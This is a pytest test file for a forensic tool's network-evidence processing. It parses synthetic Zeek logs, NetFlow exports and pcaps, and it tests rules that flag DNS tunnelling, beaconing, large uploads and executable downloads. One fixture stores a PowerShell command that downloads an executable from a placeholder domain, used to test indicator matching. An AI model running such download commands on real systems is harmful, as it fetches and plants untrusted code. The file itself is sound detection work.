"""Network evidence (elrond.py --Network, process/network.py): Zeek's logs, NetFlow exports, the
technique rules, and the folder Elrond writes, on fixtures built here. The Zeek lines are as
Zeek 7.0.5 wrote them for a synthetic capture (zeek -C -r, TSV and LogAscii::use_json=T)."""
import gzip
import json
import os
import struct
import sys
from pathlib import Path

import pytest

# Appended, not prepended, as it always was (src/analysis/platform shadowed the stdlib module until it became platform_adapters).
sys.path.append(str(Path(__file__).resolve().parents[2] / "src" / "analysis"))

from rowanholt.analysis import stacking  # noqa: E402
from rowanholt.core.records import check_file, own_fields, read_records  # noqa: E402
from rowanholt.post.index_only import case_hosts  # noqa: E402
from rowanholt.process import network  # noqa: E402
from rowanholt.process.extractions import netflow, network_rules as rules, zeek_logs  # noqa: E402

T0 = 1793520000  # 2026-11-01T08:00:00Z
HEAD = "#separator \\x09\n#set_separator\t,\n#empty_field\t(empty)\n#unset_field\t-\n#path\t{}\n#open\t2026-11-08-08-18-36\n"
CONN_FIELDS = ("ts uid id.orig_h id.orig_p id.resp_h id.resp_p proto service duration orig_bytes resp_bytes conn_state "
               "local_orig local_resp missed_bytes history orig_pkts orig_ip_bytes resp_pkts resp_ip_bytes "
               "tunnel_parents").split()
CONN_TYPES = ("time string addr port addr port enum string interval count count string bool bool count string count "
              "count count count set[string]").split()
DNS_FIELDS = ("ts uid id.orig_h id.orig_p id.resp_h id.resp_p proto trans_id rtt query qclass qclass_name qtype "
              "qtype_name rcode rcode_name AA TC RD RA Z answers TTLs rejected").split()
DNS_TYPES = ("time string addr port addr port enum count interval string count string count string count string bool "
             "bool bool bool count vector[string] vector[interval] bool").split()
FILES_FIELDS = ("ts fuid uid id.orig_h id.orig_p id.resp_h id.resp_p source depth analyzers mime_type filename duration "
                "local_orig is_orig seen_bytes total_bytes missing_bytes overflow_bytes timedout parent_fuid md5 sha1 "
                "sha256 extracted extracted_cutoff extracted_size").split()
FILES_TYPES = ("time string string addr port addr port string count set[string] string string interval bool bool count "
               "count count count bool string string string string string bool count").split()
CONN_LINES = [
    "1793520001.000000\tCErt2W2vWqQXIwFFM5\t10.10.0.5\t49200\t203.0.113.10\t80\ttcp\thttp\t0.004599\t148\t2129\tSF\tT\tT\t0\tShADadFf\t7\t428\t5\t2329\t-",
    "1793520006.000000\tCTe6YJZ4XzgaaxZch\t10.10.0.5\t49201\t198.51.100.20\t4433\ttcp\tssl\t0.004199\t83\t0\tSF\tT\tT\t0\tShADaFf\t5\t283\t3\t120\t-",
]
DNS_LINE = ("1793520000.000000\tCy8tyq3o9KMgwnYvcf\t10.10.0.5\t53001\t10.10.0.1\t53\tudp\t4097\t0.009999\t"
            "updates.example-cdn.com\t1\tC_INTERNET\t1\tA\t0\tNOERROR\tF\tF\tT\tT\t0\t203.0.113.10\t300.000000\tF")
FILES_LINE = ("1793520001.003199\tFaJnPt36Ex3KVe5LGb\tCErt2W2vWqQXIwFFM5\t10.10.0.5\t49200\t203.0.113.10\t80\tHTTP\t0\t"
              "SHA1,MD5,PE\tapplication/x-dosexec\t-\t0.000200\tT\tF\t2048\t2048\t0\t0\tF\t-\t"
              "6cf573f5d2390b2bcc7327dda733e36f\t22abe6dde9abd5c254492fb2ce2175f260626c52\t-\t-\t-\t-")
CONN_JSON = ('{"ts":1793520001.0,"uid":"CROnC729EAb73JddQi","id.orig_h":"10.10.0.5","id.orig_p":49200,'
             '"id.resp_h":"203.0.113.10","id.resp_p":80,"proto":"tcp","service":"http","duration":0.004599094390869141,'
             '"orig_bytes":148,"resp_bytes":2129,"conn_state":"SF","local_orig":true,"local_resp":true,"missed_bytes":0,'
             '"history":"ShADadFf","orig_pkts":7,"orig_ip_bytes":428,"resp_pkts":5,"resp_ip_bytes":2329}')


def zeek_tsv(path: Path, name: str, fields, types, lines) -> Path:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(HEAD.format(name) + "#fields\t" + "\t".join(fields) + "\n#types\t" + "\t".join(types) + "\n"
                    + "".join(line + "\n" for line in lines) + "#close\t2026-11-08-08-18-36\n")
    return path


def conn_line(ts: float, resp: str, port: int, service: str = "-", sent: int = 21, received: int = 21, uid: str = "C1") -> str:
    return (f"{ts:.6f}\t{uid}\t10.10.0.5\t49300\t{resp}\t{port}\ttcp\t{service}\t0.004\t{sent}\t{received}\tSF\tT\tT\t0\t"
            f"ShADadFf\t6\t261\t4\t181\t-")


def dns_line(ts: float, query: str, qtype: str = "TXT", rcode: str = "NXDOMAIN", answers: str = "-") -> str:
    return (f"{ts:.6f}\tCdns\t10.10.0.5\t53100\t10.10.0.1\t53\tudp\t8192\t-\t{query}\t1\tC_INTERNET\t16\t{qtype}\t3\t"
            f"{rcode}\tF\tF\tT\tF\t0\t{answers}\t-\tT")


def pcap_bytes() -> bytes:
    """A one-packet pcap: Ethernet, IPv4, UDP to port 53."""
    frame = b"\x02" * 12 + b"\x08\x00" + struct.pack("!BBHHHBBH4s4s", 0x45, 0, 28, 0, 0, 64, 17, 0,
                                                       bytes([10, 10, 0, 5]), bytes([10, 10, 0, 1])) + b"\x00" * 8
    return (struct.pack("<IHHiIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535, 1)
            + struct.pack("<IIII", T0, 0, len(frame), len(frame)) + frame)


def keyed(rows):
    return list(enumerate(rows))


# ---------------------------------------------------------------- Zeek's logs

def test_tsv_log_as_rows(tmp_path):
    path = zeek_tsv(tmp_path / "conn.log", "conn", CONN_FIELDS, CONN_TYPES, CONN_LINES)
    name, rows = zeek_logs.read_log(path)
    assert name == "conn" and len(rows) == 2
    row = rows[0]
    assert row["ts"] == "2026-11-01T08:00:01Z"
    assert row["id_orig_h"] == "10.10.0.5" and row["id_resp_p"] == 80 and row["orig_bytes"] == 148
    assert row["duration"] == pytest.approx(0.004599) and row["local_orig"] is True
    assert row["tunnel_parents"] == []  # unset set: a list, empty
    assert "id.orig_h" not in row  # dotted names: underscores


def test_tsv_sets_vectors_and_unset(tmp_path):
    path = zeek_tsv(tmp_path / "files.log", "files", FILES_FIELDS, FILES_TYPES, [FILES_LINE])
    row = zeek_logs.read_log(path)[1][0]
    assert row["analyzers"] == ["SHA1", "MD5", "PE"]
    assert row["filename"] == "" and row["sha256"] == ""
    assert row["is_orig"] is False and row["seen_bytes"] == 2048
    dns = zeek_tsv(tmp_path / "dns.log", "dns", DNS_FIELDS, DNS_TYPES, [DNS_LINE])
    row = zeek_logs.read_log(dns)[1][0]
    assert row["answers"] == ["203.0.113.10"] and row["TTLs"] == [300.0]


def test_json_log_reads_as_the_tsv_does(tmp_path):
    (tmp_path / "conn.log").write_text(CONN_JSON + "\n")
    name, rows = zeek_logs.read_log(tmp_path / "conn.log")
    tsv = zeek_logs.read_log(zeek_tsv(tmp_path / "tsv" / "conn.log", "conn", CONN_FIELDS, CONN_TYPES, CONN_LINES[:1]))[1][0]
    assert name == "conn"
    for field in ("ts", "id_orig_h", "id_orig_p", "id_resp_h", "id_resp_p", "proto", "service", "orig_bytes", "resp_bytes"):
        assert rows[0][field] == tsv[field], field


def test_log_names_rotated_gzipped_and_renamed(tmp_path):
    rotated = tmp_path / "dns.09:00:00-10:00:00.log.gz"
    with gzip.open(rotated, "wt") as fh:
        fh.write(HEAD.format("dns") + "#fields\t" + "\t".join(DNS_FIELDS) + "\n#types\t" + "\t".join(DNS_TYPES) + "\n"
                 + DNS_LINE + "\n")
    assert zeek_logs.log_kind(rotated) == ("tsv", "dns")
    assert zeek_logs.read_log(rotated)[1][0]["query"] == "updates.example-cdn.com"
    renamed = zeek_tsv(tmp_path / "evidence-17.txt", "conn", CONN_FIELDS, CONN_TYPES, CONN_LINES)
    assert zeek_logs.log_kind(renamed) == ("tsv", "conn")  # #path wins over the file name
    streamed = tmp_path / "out.json"
    streamed.write_text('{"_path":"http","ts":1793520001.5,"uid":"C1","id.orig_h":"10.10.0.5","host":"a.example"}\n')
    assert zeek_logs.log_kind(streamed) == ("json", "http")
    assert "_path" not in zeek_logs.read_log(streamed)[1][0]


def test_not_zeek_logs(tmp_path):
    (tmp_path / "notes.txt").write_text("separator: none\n")
    (tmp_path / "other.json").write_text('{"ts": 1, "name": "not zeek"}\n')
    assert zeek_logs.log_format(tmp_path / "notes.txt") == ""
    assert zeek_logs.log_format(tmp_path / "other.json") == ""
    with pytest.raises(zeek_logs.ZeekLogError):
        list(zeek_logs.iter_log(tmp_path / "notes.txt"))


# ---------------------------------------------------------------- NetFlow

NFDUMP_CSV = """ts,te,td,sa,da,sp,dp,pr,flg,fwd,stos,ipkt,ibyt,opkt,obyt,in,out,sas,das,smk,dmk,dtos,dir,nh,nhb,svln,dvln,ismc,odmc,idmc,osmc,mpls1,mpls2,mpls3,mpls4,mpls5,mpls6,mpls7,mpls8,mpls9,mpls10,cl,sl,al,ra,eng,exid,tr
2026-11-01 08:00:01,2026-11-01 08:00:02,1.004,10.10.0.5,192.0.2.50,49400,443,TCP,.AP.SF,0,0,15000,22020096,0,0,0,0,0,0,0,0,0,0,0.0.0.0,0.0.0.0,0,0,00:00:00:00:00:00,00:00:00:00:00:00,00:00:00:00:00:00,00:00:00:00:00:00,0-0-0,0-0-0,0-0-0,0-0-0,0-0-0,0-0-0,0-0-0,0-0-0,0-0-0,0-0-0,0.000,0.000,0.000,127.0.0.1,0/0,1,1970-01-01 00:00:00.000
2026-11-01 08:00:05,2026-11-01 08:00:05,0.010,10.10.0.5,10.10.0.1,53001,53,17,......,0,0,1,81,0,0,0,0,0,0,0,0,0,0,0.0.0.0,0.0.0.0,0,0,00:00:00:00:00:00,00:00:00:00:00:00,00:00:00:00:00:00,00:00:00:00:00:00,0-0-0,0-0-0,0-0-0,0-0-0,0-0-0,0-0-0,0-0-0,0-0-0,0-0-0,0-0-0,0.000,0.000,0.000,127.0.0.1,0/0,1,1970-01-01 00:00:00.000
Summary
flows,bytes,packets,avg_bps,avg_pps,avg_bpp
2,22020177,15001,0,0,0
"""
RWCUT = """            sIP|            dIP|sPort|dPort|pro|   packets|     bytes|   flags|                  sTime| duration|                  eTime|
       10.10.0.5|   198.51.100.30|49300|  443|  6|         6|       261| FS PA  |2026/11/01T08:01:40.000|    0.004|2026/11/01T08:01:40.004|
"""


def test_nfdump_csv(tmp_path):
    path = tmp_path / "flows.csv"
    path.write_text(NFDUMP_CSV)
    assert netflow.is_flow_export(path)
    rows = list(netflow.flow_rows(path))
    assert len(rows) == 2  # the summary isn't a flow
    assert rows[0]["Start"] == "2026-11-01T08:00:01Z" and rows[0]["SrcAddr"] == "10.10.0.5"
    assert rows[0]["DstPort"] == 443 and rows[0]["Bytes"] == 22020096 and rows[0]["Proto"] == "TCP"
    assert rows[1]["Proto"] == "UDP"  # protocol numbers named


def test_silk_rwcut(tmp_path):
    path = tmp_path / "flows.txt"
    path.write_text(RWCUT)
    assert netflow.is_flow_export(path)
    row = next(netflow.flow_rows(path))
    assert row["DstAddr"] == "198.51.100.30" and row["Proto"] == "TCP" and row["Bytes"] == 261
    assert row["Start"] == "2026-11-01T08:01:40Z"


def test_csv_that_isnt_flows(tmp_path):
    path = tmp_path / "users.csv"
    path.write_text("name,uid,shell\nroot,0,/bin/bash\n")
    assert not netflow.is_flow_export(path)


# ---------------------------------------------------------------- the rules

def test_dns_tunnelling_needs_twenty_long_names(tmp_path):
    lines = [dns_line(T0 + i, f"a{i:02d}" + "x" * 40 + ".tunnel.example-dns.org") for i in range(20)]
    rows = zeek_logs.read_log(zeek_tsv(tmp_path / "dns.log", "dns", DNS_FIELDS, DNS_TYPES, lines))[1]
    found = rules.dns_tunnelling(keyed(rows))
    assert len(found) == 20
    flag, techniques = found[0][0]
    assert techniques == ["T1071.004", "T1572"] and "20 distinct long names under example-dns.org" in flag
    assert rules.dns_tunnelling(keyed(rows[:19])) == {}


def test_dns_tunnelling_leaves_short_names_and_reverse_lookups():
    rows = [{"query": f"host{i}.example.com", "id_orig_h": "10.0.0.5"} for i in range(50)]
    rows += [{"query": f"{i}.{'1' * 40}.in-addr.arpa", "id_orig_h": "10.0.0.5"} for i in range(50)]
    assert rules.dns_tunnelling(keyed(rows)) == {}
    assert rules.parent_domain("a.b.example.co.uk") == "example.co.uk"


def test_beaconing_steady_interval(tmp_path):
    lines = [conn_line(T0 + 100 + i * 60, "198.51.100.30", 443) for i in range(12)]
    rows = zeek_logs.read_log(zeek_tsv(tmp_path / "conn.log", "conn", CONN_FIELDS, CONN_TYPES, lines))[1]
    found = rules.beaconing(keyed(rows))
    assert len(found) == 12
    flag, techniques = found[0][0]
    assert techniques == ["T1071"]  # Zeek didn't name the protocol: the parent technique only
    assert "12 to 198.51.100.30:443" in flag and "every 60s" in flag
    named = [dict(r, service="http") for r in rows]
    assert rules.beaconing(keyed(named))[0][0][1] == ["T1071.001"]


def test_beaconing_leaves_jitter_few_and_infrastructure():
    def rows(times, port=443):
        return keyed({"ts": t, "id_orig_h": "10.0.0.5", "id_resp_h": "198.51.100.30", "id_resp_p": port} for t in times)

    assert rules.beaconing(rows([T0 + i * 60 for i in range(9)])) == {}  # nine is too few
    assert rules.beaconing(rows([T0 + i * 60 + (i % 3) * 25 for i in range(12)])) == {}  # jittery
    assert rules.beaconing(rows([T0 + i * 2 for i in range(30)])) == {}  # a burst, not a check-in
    assert rules.beaconing(rows([T0 + i * 60 for i in range(12)], port=123)) == {}  # NTP is regular by design


def test_non_standard_port():
    def check(service, port):
        return rules.non_standard_port(keyed([{"id_orig_h": "10.0.0.5", "id_resp_h": "198.51.100.20",
                                               "id_resp_p": port, "service": service}]))

    flag, techniques = check("ssl", 4433)[0][0]
    assert techniques == ["T1571"] and flag == "ssl on port 4433"
    assert check("ssl", 443) == {} and check("smtp,ssl", 25) == {} and check("-", 4444) == {}
    assert check("ssh", 443)[0][0][1] == ["T1571", "T1572"]
    assert check("dns", 5353) == {} and check("dns", 8053)[0][0][1] == ["T1571"]


def test_large_upload():
    big = rules.LARGE_UPLOAD_BYTES

    def check(sent, received, port=443, resp="192.0.2.50"):
        return rules.large_upload(keyed([{"id_orig_h": "10.0.0.5", "id_resp_h": resp, "id_resp_p": port,
                                          "service": "ssl", "orig_bytes": sent, "resp_bytes": received}]))

    flag, techniques = check(big, 4096)[0][0]
    assert techniques == ["T1048"] and f"{big:,} bytes to 192.0.2.50:443 (ssl)" in flag
    assert check(big - 1, 0) == {}
    assert check(big, big) == {}  # a download as large: not one-way
    assert check(big, 0, port=445) == {}  # a copy to a file server
    flows = rules.large_upload(keyed([{"Start": "2026-11-01T08:00:01Z", "SrcAddr": "10.0.0.5", "DstAddr": "192.0.2.50",
                                       "DstPort": 443, "Bytes": big, "OutBytes": None, "Proto": "TCP"}]))
    assert flows[0][0][1] == ["T1048"]  # one-way NetFlow: nothing known back


def test_executable_transfers(tmp_path):
    rows = zeek_logs.read_log(zeek_tsv(tmp_path / "files.log", "files", FILES_FIELDS, FILES_TYPES, [FILES_LINE]))[1]
    flag, techniques = rules.executable_transfers(keyed(rows))[0][0]
    assert techniques == ["T1105"]
    assert flag == "executable (application/x-dosexec) received over HTTP from 203.0.113.10 by 10.10.0.5"
    upload = dict(rows[0], is_orig=True)
    assert rules.executable_transfers(keyed([upload])) == {}  # sent by the client: not ingress
    smb = dict(rows[0], source="SMB", is_orig=True, filename="tool.exe")
    assert rules.executable_transfers(keyed([smb]))[0][0] == (
        "executable 'tool.exe' (application/x-dosexec) written over SMB to 203.0.113.10 by 10.10.0.5", ["T1570"])
    old = {"mime_type": "application/x-dosexec", "source": "HTTP", "is_orig": False, "tx_hosts": ["203.0.113.10"],
           "rx_hosts": ["10.10.0.5"]}  # Zeek before 6: tx/rx hosts instead of the connection
    assert "from 203.0.113.10 by 10.10.0.5" in rules.executable_transfers(keyed([old]))[0][0][0]
    text = dict(rows[0], mime_type="text/plain")
    assert rules.executable_transfers(keyed([text])) == {}


# ---------------------------------------------------------------- evidence and routing

def test_evidence_kinds(tmp_path):
    (tmp_path / "a.pcap").write_bytes(pcap_bytes())
    (tmp_path / "b.pcapng").write_bytes(b"\x0a\x0d\x0d\x0a" + b"\0" * 28)
    zeek_tsv(tmp_path / "conn.log", "conn", CONN_FIELDS, CONN_TYPES, CONN_LINES)
    (tmp_path / "flows.csv").write_text(NFDUMP_CSV)
    (tmp_path / "readme.txt").write_text("captured on the lab switch\n")
    assert [network.evidence_kind(tmp_path / n) for n in ("a.pcap", "b.pcapng", "conn.log", "flows.csv", "readme.txt")] \
        == ["pcap", "pcap", "zeek", "netflow", ""]


def test_network_sources_and_the_rest(tmp_path):
    captures = tmp_path / "captures"
    captures.mkdir()
    (captures / "a.pcap").write_bytes(pcap_bytes())
    host = tmp_path / "host"
    host.mkdir()
    (host / "disk.E01").write_bytes(b"EVF\x09")
    (host / "beside.pcap").write_bytes(pcap_bytes())
    sensor = tmp_path / "sensor"
    conn = zeek_tsv(sensor / "conn.log", "conn", CONN_FIELDS, CONN_TYPES, CONN_LINES)
    dns = zeek_tsv(sensor / "dns.log", "dns", DNS_FIELDS, DNS_TYPES, [DNS_LINE])
    single = tmp_path / "one.pcap"
    single.write_bytes(pcap_bytes())
    found, rest = network.iter_sources([str(captures), str(host), str(conn), str(dns), str(single)])
    assert found == [[str(captures)], [str(conn), str(dns)], [str(single)]]  # logs from one folder: one source
    assert rest == [str(host)]  # a host's image with a capture beside it is still the host's


def zeek_folder(tmp_path):
    sensor = tmp_path / "sensor-1"
    conn = [conn_line(T0 + 100 + i * 60, "198.51.100.30", 443, uid=f"Cb{i}") for i in range(12)] + CONN_LINES
    zeek_tsv(sensor / "conn.log", "conn", CONN_FIELDS, CONN_TYPES, conn)
    zeek_tsv(sensor / "dns.log", "dns", DNS_FIELDS, DNS_TYPES, [DNS_LINE])
    zeek_tsv(sensor / "files.log", "files", FILES_FIELDS, FILES_TYPES, [FILES_LINE])
    zeek_tsv(sensor / "packet_filter.log", "packet_filter", ["ts", "node"], ["time", "string"], ["1793520000.0\tzeek"])
    return sensor


def test_zeek_logs_cooked_into_the_case(tmp_path):
    out = tmp_path / "case"
    done = network.process_network_source(str(zeek_folder(tmp_path)), str(out))
    assert done["host"] == "sensor-1" and done["pcaps"] == 0
    assert set(done["tables"]) == {"zeek/conn", "zeek/dns", "zeek/files", "network_timeline"}  # not packet_filter
    assert done["techniques"] == ["T1071", "T1105", "T1571"]
    cooked = out / "sensor-1" / "artefacts" / "cooked"
    for table in ("zeek/conn", "zeek/dns", "zeek/files", "network_timeline"):
        assert check_file(cooked / f"{table}.jsonl") == [], table
    conn = [r for _, r in read_records(cooked / "zeek" / "conn.jsonl")]
    assert len(conn) == 14 and conn[0]["artefact"] == "zeek/conn" and conn[0]["host"] == "sensor-1"
    assert conn[0]["timestamp"] == "2026-11-01T08:01:40Z" and conn[0]["source_path"].endswith("conn.log")
    assert conn[0]["techniques"] == ["T1071"] and conn[0]["Flag"].startswith("regular connections: 12")
    assert conn[-1]["techniques"] == ["T1571"] and conn[-1]["Flag"] == "ssl on port 4433"
    assert conn[-2]["techniques"] == [] and conn[-2]["Flag"] == ""
    assert (out / "mitre_techniques.txt").read_text().split() == ["T1071", "T1105", "T1571"]
    audit = (out / "rowanholt_audit.log").read_text()
    assert ",sensor-1,identified platform,Network\n" in audit and "zeek conn.log sha256" not in audit
    assert "network evidence,zeek " in audit and " sha256 " in audit
    assert json.loads((out / "sensor-1" / "artefacts" / "network.info").read_text())["platform"] == "Network"


def test_network_timeline_in_time_order(tmp_path, monkeypatch):
    monkeypatch.setattr(network, "TIMELINE_CHUNK", 3)  # several chunks merged
    out = tmp_path / "case"
    network.process_network_source(str(zeek_folder(tmp_path)), str(out))
    timeline = [own_fields(r) for _, r in read_records(out / "sensor-1" / "artefacts" / "cooked" / "network_timeline.jsonl")]
    times = [r["Time"] for r in timeline]
    assert times == sorted(times) and len(timeline) == 16
    assert timeline[0]["Message"] == "DNS 10.10.0.5 asked 10.10.0.1 A updates.example-cdn.com -> 203.0.113.10"
    download = next(r for r in timeline if r["Source"] == "zeek/files")
    assert download["Row"] == "zeek/files:1" and download["Techniques"] == "T1105"
    assert "application/x-dosexec" in download["Message"]
    assert not list((out / "sensor-1" / "artefacts").glob(".network-timeline-*"))  # chunks cleared


def test_a_rerun_replaces_the_tables(tmp_path):
    out = tmp_path / "case"
    sensor = zeek_folder(tmp_path)
    network.process_network_source(str(sensor), str(out))
    network.process_network_source(str(sensor), str(out))
    assert len(list(read_records(out / "sensor-1" / "artefacts" / "cooked" / "zeek" / "conn.jsonl"))) == 14


def test_a_host_folder_of_the_same_name_is_left_alone(tmp_path):
    out = tmp_path / "case"
    (out / "sensor-1" / "artefacts" / "cooked").mkdir(parents=True)  # a host called sensor-1
    assert network.process_network_source(str(zeek_folder(tmp_path)), str(out))["host"] == "sensor-1-network"


def test_netflow_cooked(tmp_path):
    (tmp_path / "flows.csv").write_text(NFDUMP_CSV)
    out = tmp_path / "case"
    done = network.process_network_source(str(tmp_path / "flows.csv"), str(out))
    assert done["host"] == "flows" and done["techniques"] == ["T1048"]
    rows = [r for _, r in read_records(out / "flows" / "artefacts" / "cooked" / "netflow.jsonl")]
    assert rows[0]["timestamp"] == "2026-11-01T08:00:01Z" and rows[0]["techniques"] == ["T1048"]
    assert rows[1]["techniques"] == []


def fake_zeek(tmp_path, monkeypatch, body: str) -> Path:
    """A zeek on PATH that records its arguments and runs body (Python) in the log folder."""
    folder = tmp_path / "bin"
    folder.mkdir(exist_ok=True)
    script = folder / "zeek"
    script.write_text(f"#!{sys.executable}\nimport json, os, sys\n"
                      f"open({str(tmp_path / 'argv.json')!r}, 'w').write(json.dumps(sys.argv[1:]))\n{body}\n")
    script.chmod(0o755)
    monkeypatch.setenv("PATH", f"{folder}{os.pathsep}{os.environ.get('PATH', '')}")
    return script


def test_pcap_through_zeek(tmp_path, monkeypatch):
    fake_zeek(tmp_path, monkeypatch, f"open('conn.log', 'w').write({CONN_JSON!r} + '\\n')\n"
                                     "open('packet_filter.log', 'w').write('{\"ts\":1.0,\"node\":\"zeek\",\"filter\":\"ip\"}\\n')")
    (tmp_path / "lab.pcap").write_bytes(pcap_bytes())
    out = tmp_path / "case"
    done = network.process_network_source(str(tmp_path / "lab.pcap"), str(out))
    argv = json.loads((tmp_path / "argv.json").read_text())
    assert argv[:2] == ["-C", "-r"] and argv[2] == str((tmp_path / "lab.pcap").resolve())
    assert "LogAscii::use_json=T" in argv and "frameworks/files/hash-all-files" in argv
    assert done["pcaps"] == 1 and done["tables"] == ["zeek/conn", "network_timeline"]
    assert (out / "lab" / "artefacts" / "zeek" / "lab.pcap" / "conn.log").is_file()  # Zeek's own logs kept
    row = next(r for _, r in read_records(out / "lab" / "artefacts" / "cooked" / "zeek" / "conn.jsonl"))
    assert row["source_path"] == "artefacts/zeek/lab.pcap/conn.log" and row["id_resp_h"] == "203.0.113.10"


def test_zeek_failing_or_missing_skips_the_pcap(tmp_path, monkeypatch):
    fake_zeek(tmp_path, monkeypatch, "sys.stderr.write('fatal error: problem with trace file'); sys.exit(1)")
    (tmp_path / "lab.pcap").write_bytes(pcap_bytes())
    done = network.process_network_source(str(tmp_path / "lab.pcap"), str(tmp_path / "case"))
    assert done["pcaps"] == 0 and "problem with trace file" in done["skipped"][0]
    assert "zeek failed" in (tmp_path / "case" / "rowanholt_audit.log").read_text()
    monkeypatch.setenv("PATH", str(tmp_path / "empty"))
    monkeypatch.setattr(network, "ZEEK_PATHS", ())
    assert network.find_zeek() is None
    done = network.process_network_source(str(tmp_path / "lab.pcap"), str(tmp_path / "case2"))
    assert "Zeek isn't installed" in done["skipped"][0]


def test_no_network_evidence(tmp_path):
    (tmp_path / "readme.txt").write_text("nothing here\n")
    with pytest.raises(network.NetworkEvidenceError):
        network.process_network_source(str(tmp_path), str(tmp_path / "case"))


# ---------------------------------------------------------------- IOCs, and the rest of the case

def test_wire_iocs_matched_to_a_hosts(tmp_path, monkeypatch):
    """The FR's join: a domain in a host's PowerShell history and in DNS on the wire."""
    monkeypatch.delenv("ROWANHOLT_ONLINE_LOOKUPS", raising=False)
    from rowanholt.analysis.iocs import compare_iocs

    out = tmp_path / "case"
    cooked = out / "LAB-WIN11" / "artefacts" / "cooked"
    cooked.mkdir(parents=True)
    history = cooked / "powershell_history.jsonl"
    history.write_text(json.dumps({"host": "LAB-WIN11", "artefact": "powershell_history", "source_path": "",
                                   "timestamp": None, "techniques": [],
                                   "Command": "iwr http://updates.example-cdn.com/tools/agent.exe -OutFile a.exe"}) + "\n")
    compare_iocs(str(out) + "/", "", "LAB-WIN11::Windows", "analysing", "'LAB-WIN11'", [str(history)], 0, 0.0)
    done = network.process_network_source(str(zeek_folder(tmp_path)), str(out), extractiocs=True)
    assert done["matches"] == 1
    match = own_fields(next(r for _, r in read_records(out / "sensor-1" / "analysis" / "network_matches.jsonl")))
    assert match["Value"] == "updates.example-cdn.com" and match["Type"] == "domain"
    assert match["Host"] == "LAB-WIN11" and match["Host File"] == str(history) and match["Host Line"] == 1
    assert match["Network Table"] == "zeek/dns" and match["Network Line"] == 1
    iocs = {r["ioc"] for _, r in read_records(out / "sensor-1" / "analysis" / "iocs.jsonl")}
    assert {"updates.example-cdn.com", "203.0.113.10"} <= iocs


def test_network_folder_indexed_but_not_stacked(tmp_path):
    out = tmp_path / "case"
    network.process_network_source(str(zeek_folder(tmp_path)), str(out))
    (out / "HOST-A" / "artefacts" / "cooked").mkdir(parents=True)
    allimgs, unknown = case_hosts(str(out) + "/")
    assert allimgs[str(out / "sensor-1" / "artefacts" / "raw")] == "sensor-1::Network"
    assert unknown == ["HOST-A"]
    assert network.network_hosts(str(out)) == {str(out / "sensor-1" / "artefacts" / "raw"): "sensor-1::Network"}
    assert stacking.hosts(str(out)) == [str(out / "HOST-A")]
